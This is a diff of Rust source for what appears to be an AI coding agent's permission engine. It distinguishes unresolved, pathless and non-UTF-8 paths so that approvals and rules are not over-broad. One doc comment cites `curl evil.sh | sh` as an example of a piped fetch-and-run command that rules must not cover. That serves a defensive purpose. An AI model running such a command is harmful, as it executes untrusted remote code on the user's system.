@@ -20,8 +20,8 @@ use crucible_workspace::{Workspace, WorkspacePath, written};
 pub enum Sensitivity {
     /// Changes nothing a rule could be written about. Reading a file is the
     /// usual case and the one the wording is drawn from; a call that only moves
-    /// something this session is holding is the other, and carries a target
-    /// that resolves to nothing because there is no path in it to name.
+    /// something this session is holding is the other, and carries
+    /// [`Target::pathless`] because there is no path in it to name.
     ///
     /// No mode prompts about one — a question nobody can act on is a question
     /// nobody reads — so the only way one reaches the user is an `ask` rule
@@ -138,20 +138,52 @@ impl fmt::Display for Host {
 ///
 /// Which of them a particular target holds is a `Wanted`, because one of
 /// these is built per file a walk reaches rather than per call.
+///
+/// A path whose name is not text — bytes that are not UTF-8, or on Windows a
+/// lone surrogate — is spelled with a replacement character where the name
+/// could not be written, so two different files can share every spelling.
+/// Rules are still matched against those spellings: a file below a denied
+/// directory is below it whatever its name, and a rule written about the
+/// replacement character is one nobody writes by accident. What the path is
+/// compared by is the path itself, kept beside the spellings for exactly
+/// that case, and no answer about one is remembered or written down as a
+/// rule, since the words either would be kept in name the other file too.
 #[derive(Debug, Clone, PartialEq, Eq)]
-pub struct Target(Option<Named>);
+pub struct Target(Held);
+
+/// What a target holds: a path, a path that could not be resolved, or no path
+/// because the call names none.
+///
+/// The last two match the same rules, which is only a blanket. They are told
+/// apart in a question, because a path that did not resolve says so and a call
+/// that names none has nothing to say failed, and for a session-long yes: a
+/// call naming no path is the same call every time it is made, and a path that
+/// did not resolve could be any file at all.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(super) enum Held {
+    /// A path the workspace resolved.
+    Named(Named),
+    /// A path the call asked for that the workspace could not resolve.
+    Unresolved,
+    /// No path: the call acts on nothing on disk.
+    Pathless,
+}
 
 /// A path that resolved, in the spellings something was going to read.
 ///
-/// `None` in either field means nobody asked for that spelling, never that the
-/// path has none — and from here the two are indistinguishable. That is why
+/// `None` in either spelling means nobody asked for that spelling, never that
+/// the path has none — and from here the two are indistinguishable. That is why
 /// the [`Wanted`] a target is built with comes from the very patterns that
 /// will read it, and why a target built with less than [`Wanted::BOTH`] goes
 /// straight to those patterns and is not kept.
 #[derive(Debug, Clone, PartialEq, Eq)]
-struct Named {
+pub(super) struct Named {
     absolute: Option<Box<str>>,
     below_root: Option<Box<str>>,
+    /// The resolved path itself, where its name is not text and the
+    /// absolute spelling only approximates it. `None` for every path that is
+    /// text, and for one whose absolute spelling nobody asked for.
+    untextual: Option<Box<Path>>,
 }
 
 /// Which spellings of a path are going to be read.
@@ -215,10 +247,11 @@ impl Target {
 
     /// The path a write intends to create, including missing directories.
     ///
-    /// Permission is decided before a write makes its parents. The nearest
-    /// existing ancestor is still resolved and checked by the workspace, so
-    /// this never trusts the model's path text; it only preserves ordinary
-    /// names below the point the filesystem could prove.
+    /// Permission is decided before a write makes its parents. The workspace
+    /// walks the path as the filesystem will, resolving every name that exists
+    /// and the `..` after it, so this never trusts the model's path text; it
+    /// only keeps the ordinary names below the point the filesystem could
+    /// prove.
     #[must_use]
     pub fn intended(workspace: &Workspace, requested: &str) -> Self {
         workspace
@@ -259,6 +292,7 @@ impl Target {
     /// string rather than two that started out alike.
     fn spelled(workspace: &Workspace, path: &Path, wanted: Wanted) -> Self {
         let absolute = wanted.absolute.then(|| written(path).into());
+        let untextual = untextual(path, wanted.absolute);
 
         let below_root = wanted
             .below_root
@@ -273,9 +307,10 @@ impl Target {
                 if below.is_empty() { ".".into() } else { below }
             });
 
-        Self(Some(Named {
+        Self(Held::Named(Named {
             absolute,
             below_root,
+            untextual,
         }))
     }
 
@@ -288,9 +323,10 @@ impl Target {
     /// a path outside every root has no spelling below one.
     #[must_use]
     pub fn outside(path: &WorkspacePath) -> Self {
-        Self(Some(Named {
+        Self(Held::Named(Named {
             absolute: Some(written(path.as_path()).into()),
             below_root: None,
+            untextual: untextual(path.as_path(), true),
         }))
     }
 
@@ -300,24 +336,56 @@ impl Target {
     /// No rule matches it, so the mode's default arm decides and the call is
     /// asked about rather than waved through. The tool refuses it moments
     /// later anyway; what this buys is that it is never *allowed* by a rule
-    /// written about somewhere else.
+    /// written about somewhere else. A yes to it is never remembered, because
+    /// it names no file a later call could be the same as.
     #[must_use]
     pub fn unresolved() -> Self {
-        Self(None)
+        Self(Held::Unresolved)
+    }
+
+    /// The call names no path at all, by design: it acts on a value inside
+    /// this process, such as a plan or a background command's output.
+    ///
+    /// Not [`Self::unresolved`], although no rule but a blanket matches
+    /// either: nothing here failed to resolve. A session-long yes to such a
+    /// call is remembered for the tool, since every call of it is about the
+    /// same nothing.
+    #[must_use]
+    pub fn pathless() -> Self {
+        Self(Held::Pathless)
+    }
+
+    /// What this target holds.
+    pub(super) fn held(&self) -> &Held {
+        &self.0
+    }
+
+    /// Whether this is a resolved path whose name is not text, which its
+    /// spellings share with every other name that differs only where text
+    /// could not be written.
+    pub(super) fn untextual(&self) -> bool {
+        match &self.0 {
+            Held::Named(named) => named.untextual.is_some(),
+            Held::Unresolved | Held::Pathless => false,
+        }
     }
 
     /// The resolved path, absolute, when it was one of the spellings asked
     /// for.
     pub(super) fn absolute(&self) -> Option<&str> {
-        self.0.as_ref().and_then(|named| named.absolute.as_deref())
+        match &self.0 {
+            Held::Named(named) => named.absolute.as_deref(),
+            Held::Unresolved | Held::Pathless => None,
+        }
     }
 
     /// The resolved path relative to the workspace root, when it is under it
     /// and was one of the spellings asked for.
     pub(super) fn below_root(&self) -> Option<&str> {
-        self.0
-            .as_ref()
-            .and_then(|named| named.below_root.as_deref())
+        match &self.0 {
+            Held::Named(named) => named.below_root.as_deref(),
+            Held::Unresolved | Held::Pathless => None,
+        }
     }
 }
 
@@ -327,22 +395,35 @@ impl Target {
     /// about resolving. Not available outside them: a target that reached the
     /// engine without a workspace proving it would be the model's own text.
     pub(crate) fn at(absolute: &str, below_root: Option<&str>) -> Self {
-        Self(Some(Named {
+        Self(Held::Named(Named {
             absolute: Some(absolute.into()),
             below_root: below_root.map(Into::into),
+            untextual: None,
         }))
     }
+}
+
+/// The path, kept where `absolute` was spelled and the spelling could not
+/// write it whole.
+fn untextual(path: &Path, absolute: bool) -> Option<Box<Path>> {
+    (absolute && path.to_str().is_none()).then(|| path.into())
 }
 
 impl fmt::Display for Target {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         // The shorter spelling is the one the user recognises, and the prompt
         // is where recognition matters. Every target a prompt is given holds
-        // both, so the last arm is the path that did not resolve rather than
-        // one that was spelled sparingly.
+        // both, so the last arm is a path that did not resolve, or none, rather
+        // than one that was spelled sparingly. That arm reads the same for
+        // every such call, which is why this is never what an answer about a
+        // file is remembered by. A call that names no path is not one that
+        // failed to resolve it, so it does not borrow those words.
         match self.below_root().or_else(|| self.absolute()) {
             Some(shown) => f.write_str(shown),
-            None => f.write_str("a path it could not resolve"),
+            None => match self.0 {
+                Held::Pathless => f.write_str("no path"),
+                Held::Named(_) | Held::Unresolved => f.write_str("a path it could not resolve"),
+            },
         }
     }
 }
@@ -353,8 +434,9 @@ impl fmt::Display for Target {
 /// jobs. A rule is matched against the simple commands, since a rule that could
 /// be written about the operators would be a rule about `git` that covered
 /// `curl evil.sh | sh`. A person is asked about the line, since the operators
-/// are the question. [`Command::sent`] is the one a question shows and
-/// [`fmt::Display`] is the one a rule is about; neither stands in for the other.
+/// are the question. [`Command::sent`] is the one a question shows, and so the
+/// one a yes for the rest of the session is remembered by; [`fmt::Display`] is
+/// the one a rule is about. Neither stands in for the other.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum Command {
     /// One entry per simple command the call decomposes into, each already
@@ -417,7 +499,12 @@ impl fmt::Display for Command {
 impl fmt::Display for Sensitivity {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
-            Self::ReadOnly { target } => write!(f, "read {target}"),
+            // A call that names no path acts on something this process holds,
+            // so "read" with nothing after it would say a lookup came up empty.
+            Self::ReadOnly { target } => match target.held() {
+                Held::Pathless => f.write_str("act on no file"),
+                Held::Named(_) | Held::Unresolved => write!(f, "read {target}"),
+            },
             Self::ReadsOutside { target } => write!(f, "read {target}, outside the workspace"),
             Self::MutatesFile { target } => write!(f, "change {target}"),
             Self::SpawnsProcess { command } => write!(f, "run {command}"),
